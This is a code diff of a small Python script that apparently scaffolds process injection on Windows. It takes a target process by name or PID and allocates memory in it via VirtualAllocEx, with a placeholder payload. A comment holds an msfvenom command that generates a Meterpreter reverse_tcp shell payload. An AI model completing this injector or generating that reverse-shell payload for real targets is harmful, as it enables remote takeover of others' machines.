@@ -3,15 +3,22 @@ from argparse import ArgumentParser
 
 if __name__ == "__main__":
    parser = ArgumentParser() 
-   parser.add_argument("-id", "--by-id", default=False, help="process will be identified by pid instead of name")
+   parser.add_argument(
+        "-pid", "--by-pid",
+        default=False,
+        help="PROC will be a PID instead of a process name"
+    )
    parser.add_argument("PROC", help="the target process")
 
    args = parser.parse_args()
    
-   # msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST= LPORT= -f py
+   # msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[IP] LPORT=[port] -f python
    payload = bytearray(
       "Testing"
-   )
+   , "utf-8")
    
-   with Process(args.PROC, args.by_id) as ps_handle:
-      pass
+   with Process(args.PROC, pid=args.by_pid) as ps_handle:
+       # Allocating memory in target process with VirtualAllocEx
+       base_addr = ps_handle.virtual_alloc_ex(len(payload))
+       print(base_addr)
+       print("PID", ps_handle.pid)
